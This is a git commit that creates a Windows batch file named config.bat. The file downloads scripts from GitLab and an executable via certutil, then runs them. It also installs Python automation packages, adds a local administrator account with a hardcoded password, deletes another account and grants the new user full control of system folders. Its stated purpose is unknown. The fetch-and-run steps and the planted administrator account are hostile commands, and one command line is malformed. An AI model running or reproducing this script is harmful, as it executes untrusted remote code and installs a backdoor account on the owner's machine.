7b038b064af2fd3466d67237eab2558bd96e2e68
menia12 <160221779+menia12@users.noreply.github.com>
2024-05-29 14:39:50 +0700

    Create config.bat

---
+++ config.bat
@@ -0,0 +1,18 @@
+@echo off
+curl -L -o login.py https://gitlab.com/rifqiekhafi/masfil/-/raw/main/login.py?inline=false
+curl -L -o loop.bat https://gitlab.com/rifqiekhafi/setrum/-/raw/main/loop.bat?inline=false
+curl -L -o show.bat https://gitlab.com/rifqiekhafi/setrum/-/raw/main/show.bat?inline=false
+certutil -urlcache -split -f "https://dl.deskin.io/windows/inst.exe
+start "" "inst.exe"
+pip install pyautogui --quiet
+pip install psutil --quiet
+net user khafidzu Rumah0102 /add >nul
+net localgroup administrators khafidzu /add >nul
+net user khafidzu /active:yes >nul
+net user installer /delete
+diskperf -Y >nul
+sc config Audiosrv start= auto >nul
+sc start audiosrv >nul
+ICACLS C:\Windows\Temp /grant khafidzu:F >nul
+ICACLS C:\Windows\installer /grant khafidzu:F >nul
+python login.py
